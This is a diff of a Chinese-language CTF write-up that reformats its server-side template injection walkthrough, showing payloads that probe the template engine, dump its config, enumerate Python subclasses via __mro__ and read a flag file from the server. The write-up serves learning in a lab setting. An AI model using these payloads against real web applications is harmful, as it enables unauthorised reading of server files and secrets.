@@ -233,7 +233,11 @@ index.php
 
 知道了是模版注入，根据之前能够xss，说明渲染的模版内容受到我们的控制，所以我们要使用模版注入，插入在服务器端执行的代码
 
-先试个`{{2*10}}`
+先试个
+
+```
+{{2*10}}
+```
 
 ![](https://ws1.sinaimg.cn/large/006Vib6xly1frghc3ixjij30e50aut9f.jpg)
 
@@ -241,7 +245,11 @@ index.php
 
 成功执行，说明确实是模版注入没错
 
-再尝试输入`{{config}}`
+再尝试输入
+
+```
+{{config}}
+```
 
 得到
 
@@ -265,13 +273,23 @@ index.php
 
 当我们访问到object的类型对象的时候，就可以用`__subclasses__()`来获得当前环境下能够访问的所有对象
 
-`{{''.__class__.__mro__[2].__subclasses__()}}`或者`{{(1).__class__.__base__.__subclasses__()}}`
+```
+{{''.__class__.__mro__[2].__subclasses__()}}
+```
+
+或者
+
+```
+{{(1).__class__.__base__.__subclasses__()}}
+```
 
 ![](https://ws1.sinaimg.cn/large/006Vib6xly1frghwxbelhj31400l4gvd.jpg)
 
 看到`file`，又有刚才获得的路径，我们可以读取文件了
 
-`{{''.__class__.__mro__[2].__subclasses__()[40]('./flag/flag.txt','r').read()}}`
+```
+{{''.__class__.__mro__[2].__subclasses__()[40]('./flag/flag.txt','r').read()}}
+```
 
 得到flag`MiniLCTF{e215h-c0adj-14sjs-mn74h}`
 
